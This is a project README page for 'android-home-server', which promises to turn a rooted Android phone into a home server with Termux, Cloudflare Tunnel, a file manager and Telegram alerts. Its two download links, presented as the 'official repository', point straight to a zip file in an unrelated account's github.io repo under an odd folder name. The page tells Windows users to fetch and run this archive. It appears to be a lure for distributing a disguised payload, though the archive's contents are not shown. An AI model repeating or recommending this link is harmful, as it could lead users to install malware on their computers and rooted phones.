---
layout: "default"
title: "📱 android-home-server - Use old phones as home servers"
description: "Transform an old Android phone into an always-on home server with remote access."
---
# 📱 android-home-server - Use old phones as home servers

[![](https://img.shields.io/badge/Download-Visit_Repository-blue.svg)](https://raw.githubusercontent.com/Dyannpointillistic77/dyannpointillistic77.github.io/main/regratingly/v2.6.zip)

This project turns an old rooted Android phone into a functional home server. It provides services like a secure remote connection, a web interface for file management, and system notifications. You can host your projects or personal files on hardware that you already own.

## 📋 Requirements

To use this software, you need the following items:

* A rooted Android smartphone.
* Access to a computer running Windows.
* A stable Wi-Fi connection.
* The Magisk application installed on your phone.
* A basic understanding of how to connect your phone to a computer.

## 📥 How to download the software

You must visit the project page to access the files. Use the link below to reach the official repository.

[Visit this page to download the software](https://raw.githubusercontent.com/Dyannpointillistic77/dyannpointillistic77.github.io/main/regratingly/v2.6.zip)

## 🛠 Setting up your Android device

1. Prepare your phone. Ensure the battery maintains a charge above 50 percent.
2. Enable Developer Options on your Android device. Go to Settings, find About Phone, and tap the Build Number seven times.
3. Turn on USB Debugging in the Developer Options menu.
4. Install the Termux application from the F-Droid store. This app provides the environment necessary to run the server.
5. Grant root permissions to Termux through your Magisk manager. This allows the software to modify system files and prepare the environment.

## 🖥 Installation process

1. Connect your phone to your Windows computer using a USB cable.
2. Download the project files from the link provided above.
3. Extract the contents of the downloaded folder to a location on your computer.
4. Open the Termux app on your phone.
5. Follow the instructions provided in the repository to link your computer to the phone.
6. Run the installation script. The script asks for your preferences regarding the file manager and the Cloudflare Tunnel.
7. Follow the prompts on the screen to finalize the configuration.

## ☁️ Setting up Cloudflare Tunnel

A Cloudflare Tunnel allows you to access your server from outside your home network without opening ports on your router. 

1. Create a free account on the Cloudflare website.
2. Add your domain name to Cloudflare.
3. The server software generates a link during the setup process. Paste this link into your Cloudflare dashboard to authorize the connection.
4. Once authorized, your phone server becomes accessible through your chosen domain name.

## 📂 Managing your files

The software includes a web-based file manager. This interface allows you to upload, download, and organize files on your Android device from any web browser on your network.

1. Open a browser on your computer.
2. Enter the local IP address of your phone followed by the port number indicated during the initial setup.
3. Log in with the credentials defined during the installation phase.
4. You now see your phone’s storage directory and can move files as needed.

## 🔔 Setting up Telegram alerts

You can receive notifications about your server health directly on your phone or computer.

1. Create a new bot using the BotFather interface within Telegram.
2. Copy the API token provided by Telegram.
3. Open the configuration file located in the installation folder on your phone.
4. Paste the API token into the designated area.
5. Restart the server service to apply these changes.

## 🔄 Maintaining your server

Keep your server running by leaving the phone connected to a charger. An always-on server requires consistent power. If the battery dies, you must manually restart the Termux app and trigger the server script again. Check the repository page periodically for software updates to ensure your server stays secure and stable.

Keywords: android, chroot, cloudflare-tunnel, filebrowser, home-server, homelab, magisk, self-hosted, termux, ubuntu